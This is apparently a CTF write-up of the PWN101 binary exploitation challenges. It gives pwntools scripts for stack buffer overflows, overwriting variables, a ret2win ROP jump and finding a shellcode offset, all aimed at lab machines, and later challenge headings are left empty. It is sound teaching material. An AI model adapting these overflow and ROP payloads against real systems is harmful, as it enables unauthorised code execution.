# PWN101

### Challenge 1 - pwn101
The goal of this task was simply to overflow the buffer, I found that 100 characters were more than enough to do that, so I developed the following code:

    from pwn import *
    
    ip = "10.10.114.216"
    port = 9001
    p = remote(ip,port)
    
    offset = 100
    payload = b"A"*offset
    
    p.sendline(payload)
    
    p.interactive()
![image](https://github.com/user-attachments/assets/2e84d354-224c-4fa8-b4b9-86305ffa26e5)<br />

### Challenge 2 - pwn101
Let's disassemble the binary in IDA:<br />
![image](https://github.com/user-attachments/assets/29a5aca3-d0a8-45cb-b047-ef27bc06936c)<br />
There's a buffer stored at rbp+var_70, and `var_70` is at -70h, which is 112 bytes from the beginning of the stack. Then, var_8 is at -8h, and var_4 is at -4h. To overwrite var_8 and var_4 I need an offset of 112 - 8 = 104 bytes. Then I need to overwrite these two variables with the values provided by the program.<br />
So I developed the following pwntools exploit:

    from pwn import *
    from struct import pack
    
    #p = process("./pwn102-1644307392479.pwn102")
    ip = "10.10.109.116"
    port = 9002
    
    p = remote(ip,port)
    
    offset = 104  # Offset corretto per riempire il buffer fino alle variabili
    payload = b"A" * offset
    payload += pack("<I", 0x0C0D3)   # Scriviamo su var_8 (prima nello stack)
    payload += pack("<I", 0x0C0FF33) # Scriviamo su var_4 (dopo var_8)
    
    p.sendline(payload)
    p.interactive()
`pack("<I", 0x0C0D3)` outputs the address in little endian format:<br />
![image](https://github.com/user-attachments/assets/4910ea60-6ed6-4121-90f0-d7daad62cea0)<br />

### Challenge 3 - pwn101
If I look at the binary with pwngdb, I can see that there's a function called `admins_only`:<br />
![image](https://github.com/user-attachments/assets/f0727e08-4d5a-4075-9a39-88c2bb520966)<br />
And this is the content of that function.<br />
![image](https://github.com/user-attachments/assets/e435b351-78ed-42d4-8b7e-41c169d132a0)<br />
Also, If I use checksec:<br />
![image](https://github.com/user-attachments/assets/bb12280d-02b0-47bd-a102-ab5704cce4b6)<br />
Only NX is enabled, which is not a problem. Since the binary is not PIE, the address of the function `admins_only` is alywas the same. To find it out, on gdb, run `info functions admins_only`. The address is `0x0000000000401554`.<br />
Now I need to find the offset to overflow the RIP. Using the binary, I learned that the point that is vulnerable to buffer overflow is in the "general" section. So I first have to press `3` to go in the general section, and then I can overflow a buffer and get a segmentation fault. To find the offset to this segmentation fault I used `cyclic` inside pwngdb:<br />
![image](https://github.com/user-attachments/assets/e268a98f-a9fc-45de-bc70-bef0a7150bee)<br />
The offset is 40 bytes. So I developed the following exploit:<br />

    from pwn import *
    
    #p = process("./pwn103-1644300337872.pwn103")
    ip = "10.10.109.116"
    port = 9003
    
    p = remote(ip,port)
    
    elf = ELF("./pwn103-1644300337872.pwn103")
    
    rop = ROP(elf)
    
    ret_addr = rop.find_gadget(["ret"])[0]
    
    p.sendline(b"3")
    
    offset = 40
    
    payload = b"A"*40
    payload += p64(ret_addr)
    payload += p64(0x0000000000401554)
    
    p.sendline(payload)
    
    p.interactive()
This code first sends the command `3`, and then sends the payload. Notice that I had to add a `ret` gadget because of stack alignment issues.<br />
![image](https://github.com/user-attachments/assets/31ffefbd-edd5-4b2d-ab65-04c08259206e)<br />

### Challenge 4 - pwn101
The program behaves like this: <br />
![image](https://github.com/user-attachments/assets/d614f503-2876-4121-9ae3-e52dc651ce58)<br />
Looking at the binary, it doesn't seem to contain any vulnerable function:<br />
![Screenshot 2025-03-17 143411](https://github.com/user-attachments/assets/af57de69-c1b3-4181-ad72-2f0808a5c1cc)<br />
However it is leaking the address of the buffer that I'm going to overflow. Also, if I run checksec, I get this:<br />
![Screenshot 2025-03-17 143800](https://github.com/user-attachments/assets/34041018-4b45-4eba-a1f7-a685a20635fc)<br />
The stack is executable. This means that I can overflow the buffer with shellcode, and then overwrite the RIP with the address of the shellcode.<br />
Let's find the offset. I use the following code to do that:

    from pwn import *
    
    io = process('./pwn104-1644300377109.pwn104')
    #print(io.recvregex(b':')) # read until we get the prompt
    
    io.recvline()
    io.sendline(cyclic(3000))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)
![image](https://github.com/user-attachments/assets/50af6090-9313-455e-a70e-43e7a234caac)<br />
So the offset is `88`. The problem is that the address of the buffer changes at every execution. I don't really now why. Checksec says that the binary is not PIE, so it shouldn't be like that. Maybe I'm missing something. <br />
But it's not important. Since the program leaks the address of the buffer, I can use that as a reference.

### Challenge 5 - pwn101

### Challenge 6 - pwn101

### Challenge 7 - pwn101

### Challenge 8 - pwn101

### Challenge 8 - pwn101

### Challenge 10 - pwn101
